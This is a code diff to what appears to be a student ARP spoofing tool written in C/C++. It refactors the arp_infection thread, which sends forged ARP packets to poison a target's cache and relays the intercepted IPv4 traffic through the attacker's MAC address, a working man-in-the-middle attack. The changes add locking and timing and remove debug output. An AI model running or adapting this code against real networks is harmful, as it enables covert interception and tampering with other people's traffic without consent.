@@ -12,6 +12,7 @@ void sig_handler(int signo)
 	if(signo == SIGINT)
     {
         chk_val = 0;
+        Sem_post(&s);
 		signal(SIGINT,SIG_DFL);	//make sigint default
     }
 }
@@ -75,11 +76,18 @@ void arp_infection(void* arg)
     {
         while(chk_val)
         {
-            puts("arp-infection - p");
-            cout << pthread_self() << " : " <<string(sarg.t_ip) << endl;
+            time_t sT = time(NULL);
+            volatile time_t eT = sT;
+            Pthread_mutex_lock(&mutex2);
             send_arp(sarg.handle,p1);
             send_arp(sarg.handle,p2);
-            sleep(PERIOD);
+            Pthread_mutex_unlock(&mutex2);
+            while((double)(eT-sT) < (double)PERIOD)
+            {
+                if(!chk_val) break;
+                eT = time(NULL);
+                Sem_wait(&s);
+            }
         }
     }
     else if(sarg.status == NP)
@@ -96,13 +104,8 @@ void arp_infection(void* arg)
             memcpy(&arp,packet, sizeof(arp));
             memcpy(&ip,packet,sizeof(ip));
             
-          
-            
-            
-            
             if(arp.eth_.type() == EthHdr::Arp)  //non periodic infection
             {
-                puts("arp-infection - np");
                 if (arp.arp_.op() == ArpHdr::Request && (arp.arp_.tip() == sarg.t_ip || (arp.arp_.sip() == sarg.s_ip || arp.arp_.sip() == sarg.t_ip)))
                 {
                     send_arp(sarg.handle,p1);
@@ -112,49 +115,29 @@ void arp_infection(void* arg)
             
             else if(arp.eth_.type() == EthHdr::Ip4)  //relay
             {
-                //puts("relay...");
                 map<Ip,Mac> table = *(sarg.table);
                 Ip sip = ip.ip_.sip();
                 Ip dip = ip.ip_.dip();
-                
-
                 if(table.find(sip) != table.end() || table.find(dip) != table.end())
                 {
-                    cout << "relay request detected!!" << endl;
-                    for(int i = 0; i < 20; i++){
-                        printf("%hhx ", packet[14+i]);
-                    }
-                    
-                    cout << string(sip) << endl << string(dip) << endl;
-                       
                     ip.eth_.smac_ = sarg.a_mac;
                     ip.eth_.dmac_ = table[sarg.t_ip];
-                    cout << string(ip.eth_.dmac_) << endl;
                     uint16_t offset = ETHER_HDR_LEN+IP_HDR_LEN;
                     uint16_t size = ip.ip_.tlen() - IP_HDR_LEN;
-                    printf("is this right? : %d\n",ip.ip_.tlen());
-                    printf("relay packet size : %d\n",size);
-                    int total_size = size + offset + IP_HDR_LEN;
-                    u_char* r_pkt = (u_char*)calloc(1, total_size);    //to make sure NULL;
+                    uint32_t total_size = size + offset + IP_HDR_LEN;
+                    u_char* r_pkt = (u_char*)calloc(1, total_size+1);    //to make sure NULL;
                     memcpy(r_pkt,&ip,sizeof(EthIpPacket));
                     memcpy(r_pkt+sizeof(EthIpPacket),packet+offset,size);
                     
-                    for(int i = 0; i < 20; i++){
-                    	printf("%hhx ", r_pkt[i]);
-                    }
-                    
-                    int res = pcap_sendpacket(sarg.handle, (const u_char*)(r_pkt), size + offset + IP_HDR_LEN);
-                    if (res != 0)
-                    {
-                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(sarg.handle));
-                        free(r_pkt);
-                        pthread_exit(NULL);
-                    }
+                    Pthread_mutex_lock(&mutex1);
+                    int res = pcap_sendpacket(sarg.handle,(const u_char*)(r_pkt),total_size);
+                    Pthread_mutex_unlock(&mutex1);
                     free(r_pkt);
                 }
-                //else puts("nah....");
             }
             Pthread_mutex_unlock(&mutex2);
+            Sem_post(&s);
+            sleep(1.5);
         }
     }
 }
